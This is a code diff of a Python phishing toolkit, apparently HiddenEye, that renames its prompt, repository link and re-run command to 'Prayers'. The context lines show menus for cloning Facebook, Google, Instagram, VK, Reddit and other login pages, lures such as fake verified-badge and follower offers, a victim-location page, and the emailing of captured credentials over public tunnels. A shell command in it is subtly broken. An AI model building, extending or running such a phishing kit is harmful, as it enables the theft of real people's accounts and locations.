@@ -174,7 +174,7 @@ def selectPort():  # Question where user must select port
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
     print("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(MAIN0, MAIN4))
-    choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
+    choice = input(" \n{0}Prayers >>> {2}".format(MAIN0, MAIN4, MAIN2))
     try:
         if (int(choice) > 65535 or int(choice) < 1):
             return selectPort()
@@ -196,7 +196,7 @@ def selectServer(port):  # Question where user must select server
         "\n {0}[{1}*{0}]{0}Select Any Available Server:{1}".format(MAIN0, MAIN4))
     print("\n {0}[{1}0{0}]{1}LOCALHOST \n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo (Currently DOWN)\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel (Package Version)\n {0}[{1}5{0}]{1}Localtunnel (Binary Version)[Buggy]\n {0}[{1}6{0}]{1}OpenPort\n {0}[{1}7{0}]{1}Pagekite\n".format(MAIN0, MAIN2))
 
-    choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
+    choice = input(" \n{0}Prayers >>> {2}".format(MAIN0, MAIN4, MAIN2))
     if choice == '0':
         system('clear')
         runLocalhost(port)
@@ -234,7 +234,7 @@ def runLocalhost(port):
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
     print("\n {0}[{1}*{0}]{0}Enter Your LocalHost/Router Address [ifconfig]:{1}".format(MAIN0, MAIN4))
-    host = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
+    host = input(" \n{0}Prayers >>> {2}".format(MAIN0, MAIN4, MAIN2))
     system("fuser -k %s/tcp > /dev/null 2>&1".format(port))
     system("cd Server/www/ && php -S {0}:{1} > /dev/null 2>&1 &".format(host, port))
     print('\n[*] Starting Server On Address:: {0}:{1}'.format(host, port))
@@ -618,7 +618,7 @@ def runLT(port, npm):
 def runMainMenu():  # menu where user select what they wanna use
     # Terms Of Service
     print("            _________________________________________________\n           |   WITH GREAT POWER , COMES GREAT RESPONSIBILITY |     \n            +++++++++++++++++++++++++++++++++++++++++++++++++")
-    if input("\n\n\n\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational/testing purposes only? ({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0)).upper() != 'Y':
+    if input("\n\n\n\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational/testing purposes only? ({0}Y{1}/{2}N{1})\n{2}Prayers >>> {0}".format(MAIN2, MAIN4, MAIN0)).upper() != 'Y':
         system('clear')
         print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(MAIN0, MAIN4))
         exit()
@@ -668,15 +668,15 @@ ________________________________________________________________________________
     print("\n{0}SOCIAL-ENGINEERING-TOOLS:".format(MAIN0, MAIN2))
     print(" {0}[{1}A{0}]{1} Get Victim Location".format(MAIN0, MAIN2))
 
-    option = input("\n{0}HiddenEye >>>  {1}".format(MAIN0, MAIN2))
+    option = input("\n{0}Prayers >>>  {1}".format(MAIN0, MAIN2))
     if option == '1' or option == '01':
         loadModule('Facebook')
-        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}Prayers >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Facebook', customOption)
     elif option == '2' or option == '02':
         loadModule('Google')
         customOption = input(
-            "\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
+            "\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}Prayers >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Google', customOption)
     elif option == '3' or option == '03':
         loadModule('LinkedIn')
@@ -700,7 +700,7 @@ ________________________________________________________________________________
         runPhishing('Twitter', customOption)
     elif option == '8' or option == '08':
         loadModule('Instagram')
-        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}Prayers >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Instagram', customOption)
     elif option == '9' or option == '09':
         loadModule('Snapchat')
@@ -725,7 +725,7 @@ ________________________________________________________________________________
     elif option == '14':
         loadModule('VK')
         customOption = input(
-            "\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
+            "\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}Prayers >>> {2}".format(MAIN0, MAIN4, MAIN2))
         runPhishing('VK', customOption)
     elif option == '15':
         loadModule('iCloud')
@@ -810,7 +810,7 @@ ________________________________________________________________________________
     elif option == '35':
         loadModule('Reddit')
         customOption = input(
-            "\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
+            "\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}Prayers >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Reddit', customOption)
     elif option == '36':
         loadModule('Subitoit')
@@ -838,7 +838,7 @@ ________________________________________________________________________________
     elif option == 'A' or option == 'a':
         loadModule('LOCATION')
         customOption = input(
-            "\nOperation mode:\n {0}[{1}1{0}]{1} NEAR YOU (Webpage Looks Like Legitimate)\n {0}[{1}2{0}]{1} GDRIVE (Asks For Location Permission To redirect GDRIVE) \n\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
+            "\nOperation mode:\n {0}[{1}1{0}]{1} NEAR YOU (Webpage Looks Like Legitimate)\n {0}[{1}2{0}]{1} GDRIVE (Asks For Location Permission To redirect GDRIVE) \n\n{0}Prayers >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('LOCATION', customOption)
 
     else:
@@ -1090,11 +1090,11 @@ def emailPrompt3(port):  # Ask user to start sending credentials to recipient Em
         system('clear')
         return emailPrompt3(port)
 
-def endMessage(port):  # Message when HiddenEye exit
+def endMessage(port):  # Message when Prayers exit
     choice = input(
         "\n\n{0}[{1}?{0}] Re-run(r) : Exit(x) : Send Email(M) : SelectServer(S)\n\n >> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
     if choice == 'R' or choice == 'r':
-        system('sudo python3 HiddenEye.py')
+        system('sudo python3 Prayers.py')
     elif choice == 'M' or choice == 'm':
         emailPrompt3(port)
     elif choice == 'S' or choice == 's':
@@ -1103,7 +1103,7 @@ def endMessage(port):  # Message when HiddenEye exit
         system('clear')
         print('''
                   {3}HIDDEN EYE {3}BY: DARKSEC TEAM
-            {1}https://github.com/DarkSecDevelopers/HiddenEye
+            {1}https://github.com/DarkSecDevelopers/Prayers
 
   {3}  [[*]] IF YOU LIKE THIS TOOL, THEN PLEASE HELP TO BECOME BETTER.
   {0}
